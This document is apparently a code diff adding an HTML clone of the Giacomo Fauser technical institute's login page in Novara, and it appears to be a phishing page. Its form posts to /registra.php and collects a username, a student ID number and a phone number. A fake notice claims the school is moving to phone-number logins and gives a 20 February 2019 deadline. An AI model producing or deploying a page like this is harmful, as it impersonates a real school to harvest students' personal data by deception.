@@ -1,0 +1,817 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="it-it" slick-uniqueid="3" style="" class=" js no-touch" lang="it-it">
+
+<head>
+	<!-- base href="http://www.fauser.edu/login" -->
+	<meta http-equiv="content-type" content="text/html; charset=UTF-8">
+	<meta name="keywords" content="scuola, novara, istituto, informatica, aeronautica, secondaria, istituto tecnico, itt, its, itis, istituto superiore
+studenti, ">
+	<meta name="description" content="Sito ufficiale dell'istituto Tecnico Industriale Giacomo Fauser di Novara">
+	<meta name="generator" content="Joomla! - Open Source Content Management">
+	<title>Login</title>
+	<link href="http://www.fauser.edu/templates/j51_classic/favicon.ico" rel="shortcut icon" type="image/vnd.microsoft.icon">
+	<link href="Login_files/modal.css" rel="stylesheet" type="text/css">
+	<link href="Login_files/responsive-tables.css" rel="stylesheet" type="text/css">
+	<link href="Login_files/bootstrap.css" rel="stylesheet" type="text/css">
+	<link href="Login_files/typo.css" rel="stylesheet" type="text/css">
+	<link href="Login_files/jstuff.css" rel="stylesheet" type="text/css">
+	<link href="Login_files/animate.css" rel="stylesheet" type="text/css">
+	<link href="Login_files/font-awesome_002.css" rel="stylesheet" type="text/css">
+	<link href="Login_files/nexus.css" rel="stylesheet" type="text/css">
+	<link href="Login_files/ribbon.css" rel="stylesheet" type="text/css">
+	<link href="Login_files/font-awesome.css" rel="stylesheet" type="text/css">
+	<style type="text/css">
+		.activebar-container {
+			background-color: #ccd0d9;
+			border-bottom: 1px solid #516687;
+			color: #000;
+		}
+
+		.activebar-container p {
+			margin: 5px;
+			text-align: left;
+		}
+
+		.activebar-container button {
+			float: right;
+			clear: none;
+			margin: 5px 10px;
+			padding: 5px 10px;
+		}
+
+		.activebar-container button.decline {
+			color: #fff;
+			background-color: #ee1720;
+		}
+
+		.activebar-container button.accept {
+			color: #000;
+			background-color: #0e74c4;
+		}
+
+		.activebar-container ul.links,
+		.activebar-container ul.links li {
+			display: block;
+		}
+
+		.activebar-container ul.links li {
+			margin: 0 5px;
+			float: left;
+			clear: none;
+		}
+
+		#plg_system_eprivacy {
+			width: 0px;
+			height: 0px;
+			clear: none;
+			BEHAVIOR: url(#default#userdata);
+		}
+	</style>
+	<script type="application/json" class="joomla-script-options loaded">{"system.paths":{"root":"","base":""},"system.keepalive":{"interval":3600000,"uri":"\/component\/ajax\/?format=json"},"joomla.jtext":{"JLIB_FORM_FIELD_INVALID":"Campo non valido:&#160","PLG_SYS_EPRIVACY_MESSAGE":"Questo sito utilizza cookies tecnici e sono inviati cookies di terze parti per gestire i login, la navigazione e altre funzioni. Cliccando `Accetto` permetti l`uso dei cookie, cliccando `Rifiuto` nessun cookies verr\u00e0 installato, ma le funzionalit\u00e0 del sito saranno ridotte. Nell`informativa estesa puoi trovare ulteriori informazioni riguardo l`uso dei cookies di terze parti e la loro disabilitazione. Continuando nella navigazione accetti l`uso dei cookies.","PLG_SYS_EPRIVACY_POLICYTEXT":"Visualizza la ns. Informativa Estesa.","PLG_SYS_EPRIVACY_LAWLINK_TEXT":"Visualizza la normativa europea sulla Privacy.","PLG_SYS_EPRIVACY_AGREE":"Accetto","PLG_SYS_EPRIVACY_DECLINE":"Rifiuto","PLG_SYS_EPRIVACY_CONFIRMUNACCEPT":"Eseguendo questa scelta verranno rimossi tutti i cookies utilizzati da questo sito web.I cookies di terze parti non potranno pi\u00f9 comunicare con i loro siti di riferimento, ma non potranno essere rimossi se non in altra maniera. Siete sicuri di voler disabilitare  e rimuovere i cookies?"}}</script>
+	<script src="Login_files/jquery-1.js" type="text/javascript"></script>
+	<script src="Login_files/jquery-migrate-1.js" type="text/javascript"></script>
+	<script src="Login_files/bootstrap.js" type="text/javascript"></script>
+	<script src="Login_files/jquery-noconflict.js" type="text/javascript"></script>
+	<script src="Login_files/mootools-core.js" type="text/javascript"></script>
+	<script src="Login_files/core.js" type="text/javascript"></script>
+	<script src="Login_files/mootools-more.js" type="text/javascript"></script>
+	<script src="Login_files/modal.js" type="text/javascript"></script>
+	<!--[if lt IE 9]><script src="/media/system/js/polyfill.event.js?9e6279fdf8bc78f8028b802ef4e44a66" type="text/javascript"></script><![endif]-->
+	<script src="Login_files/keepalive.js" type="text/javascript"></script>
+	<script src="Login_files/punycode.js" type="text/javascript"></script>
+	<script src="Login_files/validate.js" type="text/javascript"></script>
+	<script src="Login_files/html5fallback.js" type="text/javascript"></script>
+	<script src="Login_files/mthash.js" type="text/javascript"></script>
+	<script src="Login_files/eprivacy.js" type="text/javascript"></script>
+	<script type="text/javascript">
+
+		jQuery(function ($) {
+			SqueezeBox.initialize({});
+			SqueezeBox.assign($('a.modal').get(), {
+				parse: 'rel'
+			});
+		});
+
+		window.jModalClose = function () {
+			SqueezeBox.close();
+		};
+
+		// Add extra modal close functionality for tinyMCE-based editors
+		document.onreadystatechange = function () {
+			if (document.readyState == 'interactive' && typeof tinyMCE != 'undefined' && tinyMCE) {
+				if (typeof window.jModalClose_no_tinyMCE === 'undefined') {
+					window.jModalClose_no_tinyMCE = typeof (jModalClose) == 'function' ? jModalClose : false;
+
+					jModalClose = function () {
+						if (window.jModalClose_no_tinyMCE) window.jModalClose_no_tinyMCE.apply(this, arguments);
+						tinyMCE.activeEditor.windowManager.close();
+					};
+				}
+
+				if (typeof window.SqueezeBoxClose_no_tinyMCE === 'undefined') {
+					if (typeof (SqueezeBox) == 'undefined') SqueezeBox = {};
+					window.SqueezeBoxClose_no_tinyMCE = typeof (SqueezeBox.close) == 'function' ? SqueezeBox.close : false;
+
+					SqueezeBox.close = function () {
+						if (window.SqueezeBoxClose_no_tinyMCE) window.SqueezeBoxClose_no_tinyMCE.apply(this, arguments);
+						tinyMCE.activeEditor.windowManager.close();
+					};
+				}
+			}
+		};
+
+		window.plg_system_eprivacy_options = { "displaytype": "ribbon", "autoopen": false, "accepted": true, "policyurl": "", "lawlink": "http:\/\/eur-lex.europa.eu\/LexUriServ\/LexUriServ.do?uri=CELEX:32002L0058:IT:NOT", "version": "3.7.5", "root": "http:\/\/www.fauser.edu\/" };
+
+		jQuery(function ($) { $(".hasTooltip").tooltip({ "html": true, "container": "body" }); });
+	</script>
+
+
+
+	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+	<link rel="stylesheet" href="Login_files/responsive.css" type="text/css">
+
+	<style type="text/css">
+		@media only screen and (min-width: 960px) and (max-width: 1200px) {}
+
+		/* Responsive - Center crop logo image */
+		@media only screen and (max-width: 1200px) {}
+	</style>
+
+
+	<link rel="stylesheet" type="text/css" href="Login_files/css.css">
+
+	<style type="text/css">
+		body,
+		input,
+		button,
+		select,
+		textarea {
+			font-family: Verdana, Geneva, sans-serif
+		}
+
+		h2 {
+			font-family: Verdana, Geneva, sans-serif
+		}
+
+		.module h3,
+		.module_menu h3 {
+			font-family: Verdana, Geneva, sans-serif;
+		}
+
+		#hornav {
+			font-family: Verdana, Geneva, sans-serif
+		}
+
+		h1.logo-text a {
+			font-family: Oswald
+		}
+
+		/*--Set Logo Image position and locate logo image file--*/
+		.logo a {
+			left: 4px
+		}
+
+		.logo a {
+			top: 6px
+		}
+
+		/*--End Set Logo Image position and locate logo image file--*/
+
+		/*--Body font size--*/
+		body {
+			font-size: 13px
+		}
+
+		/*--Text Colors for Module Heads and Article titles--*/
+		body {
+			color: #516687;
+		}
+
+		h2,
+		h2 a:link,
+		h2 a:visited {
+			color: #516687;
+		}
+
+		.module h3,
+		.module_menu h3,
+		h3 {
+			color: #516687
+		}
+
+		a {
+			color: #5c9bed
+		}
+
+		/*--Text Colors for Logo and Slogan--*/
+		h1.logo-text a {
+			color: #516687;
+		}
+
+		p.site-slogan {
+			color: #516687
+		}
+
+		/*--Hornav Ul text color and dropdown background color--*/
+		#hornav ul li a {
+			color: #516687
+		}
+
+		#subMenusContainer ul,
+		#subMenusContainer ol,
+		#hornav ul ul {
+			background-color: #ffffff
+		}
+
+		/*--Start Style Side Column and Content Layout Divs--*/
+		/*--Get Side Column widths from Parameters--*/
+		#sidecol_a {
+			width: 25%
+		}
+
+		#sidecol_b {
+			width: 0%
+		}
+
+		.maincontent {
+			padding: 40px 40px 30px;
+		}
+
+		/*--Check and see what modules are toggled on/off then take away columns width, margin and border values from overall width*/
+		#content_remainder {
+			width: 100%
+		}
+
+
+		/*Style SSC layout*/
+
+		#sidecol_a {
+			float: left;
+		}
+
+		#sidecol_b {
+			float: right;
+		}
+
+		#content_remainder {
+			float: left;
+		}
+
+		/* Sidecolumn background color */
+		.backgrounds #sidecol_a,
+		.backgrounds #sidecol_b {
+			background-color: #ededed;
+		}
+
+		/*--End Style Side Column and Content Layout Divs--*/
+
+		/* Social Icons */
+
+		#socialmedia ul li a [class^="fa-"]::before,
+		#socialmedia ul li a [class*=" fa-"]::before {
+			color: #e64545
+		}
+
+		/* Wrapper Width */
+		.wrapper960,
+		.backgrounds .content_background {
+			width: 1200px;
+		}
+
+		/* Background Color */
+		body,
+		#body_bg {
+			background-color: #d1d5de;
+		}
+
+		/*-- Background Image --*/
+
+		/* Button Colour */
+		.readmore a,
+		input.button,
+		button,
+		.j51-button a,
+		.module .j51imagelinkhover .j51button a,
+		.label-info,
+		.badge-info,
+		.module_style-box .j51imagelinkhover .j51button a,
+		.search .icon-search,
+		.search .button,
+		.slicknav_btn,
+		.slidesjs-previous.slidesjs-navigation,
+		.slidesjs-next.slidesjs-navigation {
+			background-color: #516687;
+		}
+
+		.btn,
+		.btn-group.open .btn.dropdown-toggle,
+		.input-append .add-on,
+		.input-prepend .add-on,
+		.pager.pagenav a,
+		.btn-primary:active,
+		.btn-primary.active,
+		.btn-primary.disabled,
+		.btn-primary[disabled] {
+			background-color: #516687;
+		}
+
+		/* Top Menu Active Color */
+		/*#hornav > ul > li > a:hover, #hornav > ul > li.active > a, .mainMenuParentBtnFocused {
+	background-color:  !important;
+}*/
+
+		/* Top Menu */
+		.hornavmenu {
+			background-color: rgba(237, 237, 237, 0.1);
+		}
+
+		.slicknav_menu {
+			background: #ededed
+		}
+
+		.is-sticky #container_hornav .wrapper960 {
+			background-color: #ededed;
+		}
+
+		.container_spacer3 .wrapper960,
+		.container_spacer4 .wrapper960 {
+			background-color: rgba(237, 237, 237, 0.8);
+		}
+
+		/* Header */
+		#container_header {
+			background-color: rgba(209, 213, 222, 0.7);
+			border-bottom: 3px solid #516687;
+		}
+
+		#container_spacer1 {
+			background-color: #516687;
+		}
+
+		.is-sticky .header_bar {
+			background-color: rgba(209, 213, 222, 1);
+		}
+
+		/* Showcase */
+		#container_slideshow {
+			background-color: rgba(209, 213, 222, 0.1);
+		}
+
+		/* Top-1# Module Background */
+		#container_top1_modules,
+		#container_top1_modules ul.tabs li a.linkopen,
+		#container_top1_modules dl.tabs dt.open h3 a:link,
+		#container_top1_modules dl.tabs dt.open h3 a:visited,
+		.csstransforms3d .tabs a:hover span::before,
+		.csstransforms3d .tabs a:focus span::before,
+		.tabs a span {
+			background-color: rgba(81, 102, 135, 0.0);
+		}
+
+		#container_top1_modules .wrapper960 {
+			background-color: #516687;
+		}
+
+		/* Top-2# Module Background */
+		#container_top2_modules {
+			background-color: rgba(237, 237, 237, 0.0);
+		}
+
+		#container_top2_modules .wrapper960 {
+			background-color: #ededed;
+		}
+
+		/* Top-3# Module Background */
+		#container_top3_modules {
+			background-color: rgba(237, 237, 237, 0.0);
+		}
+
+		#container_top3_modules .wrapper960 {
+			background-color: #ededed;
+		}
+
+		/* Article Background Color */
+		#container_main {
+			background-color: rgba(237, 237, 237, 0.0);
+		}
+
+		#container_main .wrapper960 {
+			background-color: #ededed;
+		}
+
+		/* Bottom-1 Modules */
+		#container_bottom1_modules {
+			background-color: rgba(237, 237, 237, 0.0);
+		}
+
+		#container_bottom1_modules .wrapper960 {
+			background-color: #ededed;
+		}
+
+		/* Bottom-2 Modules */
+		#container_bottom2_modules {
+			background-color: rgba(209, 213, 222, 0.0);
+		}
+
+		#container_bottom2_modules .wrapper960 {
+			background-color: #d1d5de;
+		}
+
+		/* Base Modules */
+		#container_base {
+			background-color: rgba(81, 102, 135, 0.0);
+		}
+
+		#container_base .wrapper960 {
+			background-color: #516687;
+		}
+
+		/* Logo Image Dimensions */
+		.logo_container,
+		h1.logo,
+		h1.logo a {
+			width: px;
+			height: px;
+		}
+
+		/* Responsive Options */
+
+
+
+
+
+
+
+
+		@media only screen and (max-width: 767px) {
+			.showcase {
+				display: inline;
+			}
+
+			.mobile_showcase {
+				display: none;
+			}
+		}
+
+
+		/* Custom Reponsive CSS */
+
+
+
+		/* Module Container Padding */
+
+
+
+
+		.slicknav_menu:nth-child(2) {
+			display: none !important;
+		}
+
+
+		/* Header-# Adjustment */
+
+
+		/*--Load Custom Css Styling--*/
+	</style>
+
+
+
+
+	<script type="text/javascript" src="Login_files/modernizr.js" charset="utf-8"></script>
+
+	<!-- Animate on Scroll-->
+	<script type="text/javascript" src="Login_files/jquery.js" charset="utf-8"></script>
+
+	<!-- Hornav Responsive Menu -->
+	<script type="text/javascript" src="Login_files/responsive-nav.js" charset="utf-8"></script>
+
+	<!--[if ie 9]>
+<style type="text/css">
+.animatethis, .animateViewed {
+  opacity: 1;
+  filter: alpha(opacity=100);
+}
+</style>
+<![endif]-->
+
+	<!-- Load scripts.js -->
+	<script type="text/javascript" src="Login_files/scripts.js" charset="utf-8"></script>
+	<link href="http://www.fauser.edu/provasito1.fauser.edu/templates/j51_classic/favicon.ico" rel="shortcut icon" type="image/x-icon">
+
+	<!-- <link rel="stylesheet" href="http://basehold.it/25"> -->
+
+
+</head>
+
+<body>
+	<div class="slicknav_menu">
+		<a href="#" aria-haspopup="true" tabindex="0" class="slicknav_btn slicknav_collapsed">
+			<span class="slicknav_menutxt">MENU</span>
+			<span class="slicknav_icon">
+				<span class="slicknav_icon-bar"></span>
+				<span class="slicknav_icon-bar"></span>
+				<span  class="slicknav_icon-bar"></span>
+			</span>
+		</a>
+		<div class="slicknav_nav slicknav_hidden" style="display: none;" aria-hidden="true" role="menu">
+
+			<ul class="menu">
+				<li class="item-101"><a href="http://www.fauser.edu/" role="menuitem">Home</a></li>
+				<li class="item-117"><a href="http://www.fauser.edu/scuola" role="menuitem">La scuola</a></li>
+				<li class="item-285"><a href="http://www.fauser.edu/privacy" role="menuitem">Privacy</a></li>
+				<li class="item-102"><a href="http://www.fauser.edu/albo" role="menuitem">Albo</a></li>
+				<li class="item-116"><a href="http://www.fauser.edu/trasparenza" role="menuitem">Amministrazione Trasparente</a></li>
+				<li class="item-119"><a href="http://www.fauser.edu/personale" role="menuitem">Personale</a></li>
+				<li class="item-111"><a href="http://www.fauser.edu/area-studenti" role="menuitem">Studenti</a></li>
+				<li class="item-120"><a href="http://www.fauser.edu/famiglie" role="menuitem">Famiglie</a></li>
+				<li class="item-121"><a href="http://www.fauser.edu/contatti" role="menuitem">Contatti</a></li>
+				<li class="item-122 current active"><a href="http://www.fauser.edu/login" role="menuitem">Login</a></li>
+			</ul>
+
+		</div>
+	</div>
+
+	<div id="body_bg" data-type="background">
+
+
+		<div id="container_spacer1" class="j51container">
+			<div class="wrapper960">
+			</div>
+		</div>
+		<div id="container_spacer2" class="j51container">
+			<div class="wrapper960">
+			</div>
+		</div>
+
+		<div class="content_background_container">
+			<!-- Content background -->
+			<div class="backgrounds">
+				<div class="content_background"></div>
+			</div>
+			<!--End Content background -->
+
+			<div class="content_background">
+
+				<div id="container_header" class="j51container">
+					<div class="wrapper960">
+						<div id="socialmedia">
+							<ul id="navigation">
+
+							</ul>
+						</div>
+						<div id="header">
+
+							<div id="logo">
+
+								<div class="logo_container">
+									<div class="logo"> <a href="http://www.fauser.edu/index.php" title="">
+											<img style="display: block;" src="Login_files/logo_new_p.png" alt="Logo">
+										</a> </div>
+								</div>
+							</div>
+
+
+							<div class="clear"></div>
+
+						</div>
+						<div class="hornavmenu" style="background-color: #ededed;">
+
+							<div id="hornav">
+
+								<ul class="menu" id="moomenu">
+									<li class="item-101"><a href="http://www.fauser.edu/">Home</a></li>
+									<li class="item-117"><a href="http://www.fauser.edu/scuola">La scuola</a></li>
+									<li class="item-285"><a href="http://www.fauser.edu/privacy">Privacy</a></li>
+									<li class="item-102"><a href="http://www.fauser.edu/albo">Albo</a></li>
+									<li class="item-116"><a href="http://www.fauser.edu/trasparenza">Amministrazione Trasparente</a></li>
+									<li class="item-119"><a href="http://www.fauser.edu/personale">Personale</a></li>
+									<li class="item-111"><a href="http://www.fauser.edu/area-studenti">Studenti</a></li>
+									<li class="item-120"><a href="http://www.fauser.edu/famiglie">Famiglie</a></li>
+									<li class="item-121"><a href="http://www.fauser.edu/contatti">Contatti</a></li>
+									<li class="item-122 current active"><a href="http://www.fauser.edu/login">Login</a></li>
+								</ul>
+
+							</div>
+
+						</div>
+						<div class="clear"></div>
+
+
+
+
+						<div class="header-1">
+
+
+							<div class="custom">
+								<p style="text-align: center;"><span style="color: #516687; font-size: 12pt;">Istituto Tecnico Tecnologico
+										Giacomo Fauser</span></p>
+								<p style="text-align: center;"><span style="color: #516687; font-size: 12pt;">Via Ricci 14 - 28100 Novara</span></p>
+							</div>
+
+						</div>
+
+						<div class="header-2">
+
+
+							<div class="custom">
+								<p></p>
+
+
+
+								<style>
+
+
+									.bordo { 
+
+ 
+-moz-box-shadow: 10px 10px 5px #d1d5de; 
+
+ 
+-webkit-box-shadow: 10px 10px 5px #d1d5de; 
+ filter: progid:DXImageTransform.Microsoft.Shadow(color='#d1d5de', Direction=135, Strength=10); 
+ box-shadow: 10px 10px 5px #d1d5de; 
+
+ 
+} 
+
+ 
+</style>
+
+
+								<span style="font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;"></span>
+								<p></p>
+							</div>
+
+
+						</div>
+					</div>
+				</div>
+
+
+
+				<div class="outside_center">
+
+
+					<div id="container_main" class="j51container">
+						<div class="wrapper960 group-border-shadow">
+
+
+							<!--Setting up Layout for MainContent and Side Columns. Check to see if modules are enabled or disabled in the sidecolumns-->
+
+							<div id="main" class="block_holder">
+
+								<!--Sidecol & content background -->
+								<div class="backgrounds">
+
+
+
+									<div id="sidecol_b" style="border: 2px solid #516687; border-radius:5px;">
+									</div>
+
+									<div id="content_remainder"></div>
+								</div>
+								<!--End Sidecol & content background -->
+
+								<!--Side Columns Layout-->
+
+								
+								<!--End Side Columns Layout-->
+
+								<!--Find Content width and show component area-->
+								<div id="content_remainder" class="side_margins">
+
+									<!--Modules ContentTop-->
+
+									<!--End Modules ContentTop-->
+
+									<div class="maincontent">
+										<div class="message">
+											<div id="system-message-container">
+												Il vecchio sistema di login tramite numero di matricola sta venendo cambiato con uno nuovo basato sul numero di telefono! 
+												Tutto ciò renderà incredibilmente facile accedere, senza l'utilizzo di password da ricodare!<br>
+												<br>
+												Il Sistema entrerà in funzione entro qualche settimana. I dati vanno inseriti entro il 20 febbraio 2019.<br>
+												I dati inseriti potranno essere sostituiti solo dopo il 20 febbraio 2019 presso la segreteria didattica.
+												<br>
+												<br>
+											</div>
+
+										</div>
+										<div class="login">
+
+
+
+
+
+											<form action="/registra.php" method="post" class="form-validate form-horizontal well">
+
+												<fieldset>
+													<div class="control-group">
+														<div class="control-label">
+															<label id="username-lbl" for="username" class="required" aria-invalid="false">
+																Nome utente<span class="star">&nbsp;*</span></label>
+														</div>
+														<div class="controls">
+															<input type="text" name="username" id="username" class="validate-username required" size="25"
+															 required="required" aria-required="true" autofocus="" aria-invalid="true">
+														</div>
+													</div>
+													<div class="control-group">
+															<div class="control-label">
+																<label id="matricola-lbl" for="matricola" class="required " aria-invalid="false">
+																	Attuale Numero di Matricola<span class="star">&nbsp;*</span></label>
+															</div>
+															<div class="controls">
+																<input type="tel" name="matricola" id="matricola" class="validate-username required" size="25"
+																 required="required" aria-required="true" autofocus="" aria-invalid="true">
+															</div>
+														</div>
+													<div class="control-group">
+														<div class="control-label">
+															<label id="password-lbl" for="password" class="required">
+																Numero di Telefono<span class="star">&nbsp;*</span></label>
+														</div>
+														<div class="controls">
+															<input type="tel" name="password" id="password" value="" class="validate-password required" size="25"
+															 maxlength="99" required="required" aria-required="true"> </div>
+													</div>
+
+													<div class="control-group">
+														<div class="controls">
+															<button type="submit" class="btn btn-primary">
+																Salva
+															</button>
+														</div>
+													</div>
+
+													<input type="hidden" name="return" value="aW5kZXgucGhwP29wdGlvbj1jb21fY29udGVudCZ2aWV3PWZvcm0mbGF5b3V0PWVkaXQ=">
+													<input type="hidden" name="d5cbc56f922f97f1945fc0ff09fb9160" value="1">
+												</fieldset>
+											</form>
+										</div>
+										
+										<div class="clear"></div>
+									</div>
+
+									<!--Modules ContentBottom-->
+
+									<!--End Modules ContentBottom-->
+
+								</div>
+								<div class="clear"></div>
+								<!--End Content width and show component area-->
+
+
+
+							</div>
+							<div class="clear"></div>
+						</div>
+					</div>
+
+				</div>
+
+
+
+			</div>
+		</div>
+
+
+		<div id="container_base" class="j51container">
+			<div class="wrapper960 group-border-shadow">
+				<div id="base1_modules" class="block_holder">
+
+
+				</div>
+				<div id="base2_modules" class="block_holder">
+
+
+
+				</div>
+				<div>
+
+				</div>
+			</div>
+
+
+			<div id="container_copyright" class="j51container">
+				<div class="wrapper960">
+					<div id="footermenu">
+
+						<div class="clear"></div>
+					</div>
+					<div class="clear"></div>
+				</div>
+			</div>
+		</div>
+
+
+
+		<noscript><strong>JavaScript is currently disabled.</strong>Please enable it for a better experience of <a href="http://2glux.com/projects/jumi">Jumi</a>.</noscript>
+	</div>
+	<div id="sbox-overlay" aria-hidden="true" style="z-index: 65555; opacity: 0;" tabindex="-1"></div>
+	<div id="sbox-window" role="dialog" aria-hidden="true" style="z-index: 65557;" class="shadow">
+		<div id="sbox-content" style="opacity: 0;"></div><a id="sbox-btn-close" href="#" role="button" aria-controls="sbox-window"></a>
+	</div>
+</body>
+
+</html>
